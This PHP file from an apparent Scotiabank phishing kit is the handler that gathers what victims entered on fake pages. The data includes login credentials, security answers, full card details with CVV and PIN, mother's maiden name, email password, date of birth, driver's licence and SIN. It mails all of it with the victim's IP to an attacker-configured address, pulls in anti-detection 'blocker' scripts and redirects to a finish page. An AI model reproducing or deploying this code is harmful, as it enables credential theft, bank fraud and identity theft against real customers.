<?php
	session_start();
    include './youremail.php';
	include 'blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
	
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
    $subject = 'Login FULLZ [ '.$ip.' - '.$_SERVER['REMOTE_ADDR'].' ]';

	
    	$user = $_SESSION['username'];
    $pass = $_SESSION['password'];
    $q1 = $_SESSION['q1'];
    $q2 = $_SESSION['q2'];
    $q3 = $_SESSION['q3'];
    $a1 = $_SESSION['a1'];
    $a2 = $_SESSION['a2'];
    $a3 = $_SESSION['a3'];
   
    $cn = $_SESSION['cc'];
    $mm = $_SESSION['ccmm'];
    $yy = $_SESSION['ccyy'];
    $cvv = $_SESSION['cvv'];
    $pin = $_SESSION['pin'];
    $mmn = $_SESSION['mmn'];
	$ad = $_SESSION['AD'];
	$fn = $_SESSION['FN'];
	$pc = $_SESSION['pc'];
    
    
    
    	$fn = $_SESSION['FN'];
	$month = $_SESSION['month'];
	$day = $_SESSION['day'];
	$year = $_SESSION['year'];
	$ea = $_SESSION['EA'];
	$ep = $_SESSION['EP'];
	$dn = $_SESSION['DN'];
	$sn = $_SESSION['SN'];
	
    $browser = $_SERVER['HTTP_USER_AGENT'];
    
    
    $data= "|============ Scotia Info ===========|
User : $user
pass: $pass

Q1: $q1
A1: $a1

Q2: $q2
A2: $a2

Q3: $q3
A3: $a3
    
CC: $cn
exp: $mm-$yy
cvv: $cvv
pin: $pin

Name: $fn
AD: $ad
Pc: $pc
MMN: $mmn
name: $fn


em: $ea
EP:$ep

Dn : $dn
sSN: $sn


    
$ip
$browser ";

	if (strlen($ea) <= 25 && ($ea != "" || $dn != "" || $sn != "")){
	
	mail($to, $subject, $data);
	}
    
    header("Location: Finish.php");
 ?>